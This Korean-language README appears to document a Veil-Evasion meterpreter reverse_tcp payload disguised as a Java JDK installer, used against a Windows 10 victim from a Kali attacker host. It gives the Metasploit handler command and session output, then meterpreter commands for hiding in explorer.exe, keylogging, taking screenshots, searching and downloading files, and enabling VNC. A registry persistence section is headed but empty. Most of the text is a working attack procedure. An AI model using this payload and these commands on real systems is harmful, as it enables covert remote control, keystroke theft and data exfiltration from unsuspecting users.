## Payload 정보
1. 도구 : Veil-Framework : Evasion
2. 언어 : Python
3. Payload 타입 : reverse_tcp
4. Payload 모듈 : python/meterpreter/rev_tcp
5. Handler : Payload_rev_tcp.rc
6. Packing .exe file : jdk-21_windows-x64_bin.EXE

## 환경 구축
- Victim (win10) : Payload (jdk-21_windows-x64_bin.EXE) 다운로드
- Attacker (kali) : Handler (Payload_rev_tcp.rc) 다운로드
- Attacker IP : 192.168.94.137

## 사용법
Kali에서 Metasploit을 사용해 handler 실행

    msfconsole -r /handler 경로/Payload_rev_tcp.rc

    # **주의**
    # msf6 exploit(multi/handler) > 프롬프트 생성 시 실행 완료
    # handler 실행 이후 victim이 다운 받은 payload가 실행되어야 함


### 주요 명령어
payload가 실행되면 kali에서 meterpreter 세션이 오픈

    [*] Sending stage (175686 bytes) to 192.168.94.xxx(victim ip)
    [*] Meterpreter session 1 opened (192.168.94.137:4444 -> 192.168.94.xxx:xxxxx)

#### 세션 연결
    # 세션 확인
    sessions
    
    # 해당 id 세션 연결 => meterpreter > 프롬프트로 변경되면 성공
    sessions -i <id>

#### 프로세스 목록 숨기기
    # migrate를 사용해 권한 상승을 시도
    # explorer.exe 권한 획득으로 작업관리자 프로세스 목록에서 보이지 않음
    
    migrate -N explorer.exe

#### 시스템 정보 확인
    sysinfo
    ipconfig
    getuid
    pwd

#### KeyScan
    keyscan_start
    keyscan_dump
    keyscan_stop

#### 기타
    # 스크린샷 
    screenshot

    # 검색
    search -f *.확장자

    # 다운로드 & 업로드
    download 파일이름 kali경로
    upload /kali경로/파일이름 win경로

    # 시스템 종료
    reboot
    shutdown

    # 원격 데스크톱 활성화
    run vnc

### 지속성 획득
페이로드의 지속성을 위해 시스템 권한을 획득 후 시스템 부팅 시 자동 실행되도록 레지스트리 등록

#### 시스템 권한 획득
...
#### 레지스트리 등록
...
    
